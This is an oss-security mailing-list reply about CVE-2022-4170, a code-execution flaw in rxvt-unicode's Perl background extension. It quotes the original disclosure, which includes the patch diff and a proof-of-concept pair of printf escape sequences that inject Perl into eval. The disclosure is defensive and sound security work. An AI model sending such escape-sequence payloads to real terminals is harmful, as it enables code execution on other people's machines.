Received: (qmail 15788 invoked by uid 550); 8 Dec 2022 14:33:32 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11287 invoked from network); 8 Dec 2022 00:22:37 -0000
Date: Wed, 7 Dec 2022 18:22:21 -0600
From: John Helmert III <ajak@gentoo.org>
To: oss-security@lists.openwall.com, secalert@redhat.com
Message-ID: <Y5EuPT5dLDd4FlKe@gentoo.org>
References: <CAP9KPhDh6PJu-0mD12wYUraf1Ya1MSUPwz1PsPO5omi39-OYLw@mail.gmail.com>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
	protocol="application/pgp-signature"; boundary="TwYgzBjeJV4dye4m"
Content-Disposition: inline
In-Reply-To: <CAP9KPhDh6PJu-0mD12wYUraf1Ya1MSUPwz1PsPO5omi39-OYLw@mail.gmail.com>
Subject: Re: [oss-security] CVE-2022-4170: rxvt-unicode code execution via
 background OSC

--TwYgzBjeJV4dye4m
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

On Mon, Dec 05, 2022 at 10:22:33PM +1100, David Leadbeater wrote:
> I've discovered rxvt-unicode 9.25 and 9.26 are vulnerable to remote
> code execution, in the Perl background extension, when an attacker can
> control the data written to the user's terminal and certain options
> are set.
>=20
> The "background" extension is automatically loaded if certain X
> resources are set such as 'transparent' (see the full list at the top
> of src/perl/background[1]). So it is possible to be using this
> extension without realising it.
>=20
> This is accidentally fixed on version 9.30, and I haven't confirmed
> 9.29, it appears to not be exploitable, but only due to another (not
> security) bug. The actual bug which makes this not vulnerable on 9.30
> is simply a wrong number in "on_osc_seq".
>=20
> For 9.25 and 9.26 the patch at[2] can be backported. The body of the fix =
is:
>=20
>  sub q0 {
> -   (my $str =3D shift) =3D~ s/\x00//g; # make sure there really aren't
> any embedded NULs
> -   "q\x00$str\x00"
> +   "qq\x00\Q$_[0]\E\x00"
>  }
>=20
> Isn't Perl quoting fun? Paranoid people may wish to remove the entire
> "on_osc_seq" subroutine to avoid passing any potentially untrusted
> input anywhere near eval (this feature is deprecated and the
> maintainer did mention they are considering what to do longer term).
>=20
> It doesn't make sense to withhold an exploit for this; the fix gives a
> pretty good idea where to look and this isn't vulnerable in the latest
> version.
>=20
> $ urxvt -transparent
>=20
> Inside that running terminal:
>=20
> # Make tint be "\\", which means the ending \x00 is quoted under our cont=
rol
> $ printf '\e]705;\\\a'
> # Make the second q0 end the quoted q-string and then be valid perl
> under our control
> $ printf '\e]20;,rootalign root),`touch /tmp/cve-2022-4170` #\a'
>=20
> This has been assigned CVE-2022-4170.

Can this CVE be made public (ie, not "reserved" according to [1])?

[1] https://github.com/CVEProject/cvelist/blob/master/2022/4xxx/CVE-2022-41=
70.json

> David
>=20
> [1]: http://cvs.schmorp.de/rxvt-unicode/src/perl/background?revision=3D1.=
109&view=3Dmarkup
> [2]: http://cvs.schmorp.de/rxvt-unicode/src/perl/background?r1=3D1.105&r2=
=3D1.109

--TwYgzBjeJV4dye4m
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iHUEABYKAB0WIQQyG9yfCrmO0LPSdG2gXq2+aa/JtQUCY5EuPAAKCRCgXq2+aa/J
tdzaAP9E829Mm+Y4hFKYgaoKbhZDDNA+V+jWLAaWwlaA7NsP+AD/Zw1jWkrbEUaD
EgQAUoh5pNBeBVnSJ/YmGPDX3pKi/As=
=gsmK
-----END PGP SIGNATURE-----

--TwYgzBjeJV4dye4m--
